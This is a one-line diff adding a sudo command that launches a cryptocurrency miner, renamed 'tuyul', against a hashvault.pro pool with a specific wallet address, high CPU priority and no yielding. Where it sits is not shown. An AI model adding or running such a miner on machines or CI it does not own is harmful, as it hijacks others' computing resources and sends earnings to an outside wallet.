@@ -1,0 +1,1 @@
+sudo ./tuyul -a cn-heavy/xhv --url singapore01.hashvault.pro:443 --user hvxxvXw48Bm36cfM3NDHWp3sUiK48fbJW2eS5Snimi7TfXvxfR8nao2MMQqpWQcpNQX8RKrkvMiac3v8hppQmjrd21nwZ5K1Gj --pass HVN01 --cpu-no-yield -k --cpu-priority 5 --tls
